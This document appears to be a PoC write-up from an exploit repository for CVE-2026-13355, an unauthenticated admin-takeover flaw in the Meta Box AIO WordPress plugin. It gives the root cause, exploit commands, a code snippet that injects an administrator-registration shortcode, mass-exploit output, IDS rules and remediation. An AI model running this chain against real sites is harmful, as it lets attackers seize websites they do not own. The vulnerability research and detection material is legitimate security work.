@@ -1,0 +1,206 @@
+
+<!--
+  File: 2026-11-25_metabox-aio-unauth-admin-privesc.md
+  Location: pocs/web/
+-->
+
+---
+
+## Metadata
+
+| Field | Value |
+|---|---|
+| **Date Added** | 2026-11-25 |
+| **Last Updated** | 2026-09-22 |
+| **Author / Researcher** | murrez (PoC repository); h0xilo / Wordfence (discovery and advisory) |
+| **CVE / Advisory** | CVE-2026-13355 |
+| **Category** | web |
+| **Severity** | Critical |
+| **CVSS Score** | 9.8 (CVSSv3.1, CWE-269); full vector not included in the worklist data — see NVD |
+| **Status** | PoC |
+| **Tags** | WordPress, privilege-escalation, unauthenticated, shortcode-injection, Meta Box AIO, MB Frontend Submission, MB User Profile, CMS, content-injection, admin-account |
+| **Related** | N/A |
+
+---
+
+## Affected Target
+
+| Field | Value |
+|---|---|
+| **Software / System** | Meta Box AIO bundle for WordPress (bundled mb-frontend-submission and mb-user-profile extensions) |
+| **Versions Affected** | Meta Box AIO ≤ 3.11.0; MB Frontend Submission ≤ 4.5.6; MB User Profile ≤ 3.11.0. Fixed in Meta Box AIO 3.12.0 (authorization added to form processing) |
+| **Language / Platform** | PHP (WordPress plugin); Python 3.8+ exploit client |
+| **Authentication Required** | No |
+| **Network Access Required** | Yes |
+
+---
+
+## Summary
+
+The Meta Box AIO plugin bundle for WordPress is vulnerable to unauthenticated privilege escalation to Administrator in versions up to and including 3.11.0. The mb-frontend-submission component lets the GET parameter rwmb frontend field object id override the target object of a form without an authorization check, and the form processing routine omits the edit capability check that the render path performs, so an unauthenticated request can overwrite the post content of any page or post with an arbitrary shortcode through the WordPress update post API. The mb-user-profile component then trusts the role and auto login attributes of the injected mb user profile register shortcode without validating the requested role, which creates an Administrator account and logs the attacker in. The standalone Meta Box Frontend Submission (up to 4.5.6) and Meta Box User Profile (up to 3.11.0) plugins are also affected.
+
+---
+
+## Vulnerability Details
+
+### Root Cause
+
+Improper privilege management (CWE-269) caused by a chain of two trust failures in the Meta Box AIO bundle:
+
+1. In the mb-frontend-submission component, `populate_via_query_string()` unconditionally overrides the form's target `object_id` from the GET parameter `rwmb_frontend_field_object_id`, with no authorization check on the requested post. Separately, `Form::process()` lacks the `user_can_edit()` check that is present in `render()`, so a submission is written with `wp_update_post()` even when the requester has no edit rights on the target object.
+2. In the mb-user-profile component, the `[mb_user_profile_register]` shortcode directly trusts its `role` and `auto_login` attributes with no allow-list or capability validation, so any role name supplied in shortcode attributes is applied to the newly registered user.
+
+Because the first flaw permits writing arbitrary shortcode content into a page, the second flaw can be reached by an unauthenticated visitor.
+
+### Attack Vector
+
+Unauthenticated HTTP requests against a site that exposes a public mb-frontend-submission (mbfs) form:
+
+1. GET the frontend form page with `?rwmb_frontend_field_object_id=<target post id>` so the form is populated for an arbitrary post the attacker does not own.
+2. POST the form with `post_content` set to `[mb_user_profile_register role="administrator" auto_login="true"]`, causing `wp_update_post()` to overwrite that page's content.
+3. Request the poisoned page so the injected shortcode renders, then submit the registration fields to create an Administrator account (auto-login enabled).
+
+The chain does not work against pages that only expose mb-user-profile login or registration UI; it requires an mbfs form whose submission actually writes `post_content`.
+
+### Impact
+
+An unauthenticated remote attacker can create an Administrator account on the WordPress site, leading to full site takeover: content and user manipulation, plugin/theme installation or editing, access to stored data and secrets, and a common path to remote code execution through the theme/plugin editor or uploaded code. The upstream advisory rates this 9.8 Critical.
+
+---
+
+## Environment / Lab Setup
+
+```
+OS:          Linux (any host able to run WordPress); Python 3.8+ attacker host
+Target:      WordPress with Meta Box AIO <= 3.11.0 (or MB Frontend Submission
+             <= 4.5.6 + MB User Profile <= 3.11.0), plus at least one public
+             frontend submission form (mbfs) that writes post_content
+Attacker:    Python 3.8+ with requests (no browser required)
+Tools:       python3, requests; optionally curl/Burp Suite to inspect the chain
+```
+
+### Setup Steps
+
+```bash
+pip install -r requirements.txt
+
+python3 poc.py -u http://lab.local --mode check
+```
+
+---
+
+## Proof of Concept
+
+### Step-by-Step Reproduction
+
+1. **Fingerprint the target** — confirm the Meta Box AIO plugin is present and at or below 3.11.0; check mode also reports whether an mbfs form exists.
+   ```bash
+   python3 poc.py -u http://lab.local --mode check
+   ```
+
+2. **Confirm the writable form and object ID** — locate a page with an mbfs form and the ID of the post to overwrite (the page's own page-id works in the reference flow).
+   ```bash
+   python3 poc.py -u http://lab.local --mode check --paths /contact/ /submit/
+   ```
+
+3. **Run the exploit chain** — the client poisons `post_content` through the form and then registers the Administrator account.
+   ```bash
+   python3 poc.py -u http://lab.local --mode exploit \
+     --form-url /contact/ --object-id 12 --verify
+   ```
+
+4. **Inspect the result** — on success the console prints an OWNED line and the run is recorded in the JSONL log with the poison and register steps.
+   ```bash
+   cat cve_2026_13355_results.jsonl
+   ```
+
+5. **Verify access** — the client checks `/wp-admin/` for an authenticated session or falls back to `/wp-login.php` with the generated credentials.
+
+### Exploit Code
+
+> See [`poc.py`](./poc.py) — the relevant functions are `poison_post_content()` (step 1/2 of the chain), `register_admin()` (step 3) and `verify_admin_session()` / `verify_login()` (verification). The upstream README is archived as [`upstream-README.md`](./upstream-README.md).
+
+```python
+SHORTCODE = '[mb_user_profile_register role="administrator" auto_login="true"]'
+
+post(form_url + "?rwmb_frontend_field_object_id=" + str(object_id),
+     data={"post_content": SHORTCODE})
+
+register_page = page_url + "?rwmb_frontend_field_object_id=" + str(object_id)
+
+post(register_page, data={"user_login": user, "user_email": email,
+                          "user_pass": password})
+```
+
+### Expected Output
+
+```text
+[*] CVE-2026-13355 mass exploit | targets=1 | threads=1 | flow=on
+[+] OWNED http://lab.local | user=xxxx | pass=... | oid=12
+```
+
+The JSONL record contains `"exploited": true` with the `poison` step reporting `verified_content: true` (or `rwmb_form_submitted: true`) and the `register` step reporting `admin: true`. The upstream repository does not publish a captured lab run, so the exact output depends on the target configuration — see references.
+
+---
+
+## Detection & Indicators of Compromise
+
+- HTTP requests to a frontend page with the query parameter `rwmb_frontend_field_object_id=` pointing at a post ID the visitor does not own, especially repeated on the same page.
+- POST bodies to frontend form endpoints containing `post_content` and the string `mb_user_profile_register` with `role="administrator"` or `auto_login="true"`.
+- New WordPress users with the `administrator` role created from a frontend registration page, particularly accounts registered within seconds of an mbfs form submission.
+- WordPress audit or debug logs showing `wp_update_post` content changes on pages that the acting session cannot edit, or revision history where a page's content suddenly contains a registration shortcode.
+- Web server/WAF 403 responses on the POST step often indicate a blocked attempt; repeated 403s followed by successful registration attempts are suspicious.
+
+**Example access-log pattern:**
+
+```text
+"GET /contact/?rwmb_frontend_field_object_id=12 HTTP/1.1" 200
+"POST /contact/?rwmb_frontend_field_object_id=12 HTTP/1.1" 200
+"GET /contact/?rwmb_frontend_field_object_id=12 HTTP/1.1" 200
+```
+
+**SIEM / IDS rule (example):**
+
+```text
+alert http any any -> any any (msg:"CVE-2026-13355 Meta Box AIO object_id override"; \
+  content:"rwmb_frontend_field_object_id"; http_uri; sid:9013355;)
+```
+
+```text
+alert http any any -> any any (msg:"CVE-2026-13355 admin registration shortcode"; \
+  content:"mb_user_profile_register"; http_client_body; \
+  content:"administrator"; http_client_body; sid:9013356;)
+```
+
+---
+
+## Remediation
+
+| Action | Detail |
+|---|---|
+| **Patch** | Upgrade Meta Box AIO to 3.12.0 or later; if the extensions are installed standalone, update MB Frontend Submission above 4.5.6 and MB User Profile above 3.11.0. |
+| **Workaround** | Remove or disable public frontend submission forms that write `post_content` until patched, and avoid exposing mb-user-profile registration forms to anonymous visitors. |
+| **Config Hardening** | Restrict Administrator creation to known administrators, enable WordPress audit logging for `wp_update_post` and user-role changes, keep a WAF rule on `rwmb_frontend_field_object_id` abuse, and monitor frontend forms for injected shortcodes. |
+
+---
+
+## References
+
+- [CVE-2026-13355 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-13355)
+- [murrez/CVE-2026-13355 — source PoC](https://github.com/murrez/CVE-2026-13355)
+- [Wordfence Threat Intel advisory](https://www.wordfence.com/threat-intel/vulnerabilities/id/3b7b6e7e-b944-45f8-a6d8-bfd859bec0d1?source=cve)
+- [Meta Box AIO changelog](https://metabox.io/plugins/meta-box-aio/changelog/)
+- [Meta Box changelog](https://metabox.io/changelog/)
+
+---
+
+## Notes
+
+Auto-ingested from https://github.com/murrez/CVE-2026-13355 on 2026-11-25.
+
+Review verdict: ingested as a PoC. The repository is dual-use — it has a `check` mode that fingerprints the plugin and discovers forms, but its `exploit` mode contains the actual chain (`poison_post_content()` writing an arbitrary shortcode into a page via the object-id override, followed by `register_admin()` creating an Administrator account), so it is not a pure detector and was accepted. The mass-scan wrapper is convenience tooling around the same exploit path.
+
+License: MIT (see [LICENSE](./LICENSE)); the archived `poc.py` carries an added authorized-research header.
+
+Limitations: the upstream repository does not include a captured successful lab run, so this is treated as a PoC rather than Weaponized — success depends on the site exposing a public mbfs form whose submission actually writes `post_content`; contact/newsletter forms often lack that field, and injected shortcodes may be stripped by KSES or a security plugin. Many plugin-fingerprint hits expose only mb-user-profile login/registration UI (`plugin_mbup_only`) and are not exploitable through this chain. HTTP 403 on the POST step usually means a WAF or host is blocking the request. The helper `fofa_to_list.py` (FOFA export normalization for mass targeting) was deliberately not copied; only the exploit client, its requirements, target-list example, license and upstream README were archived. The PoC was not executed by the archivist. Use only against systems you own or have written authorization to test.
+
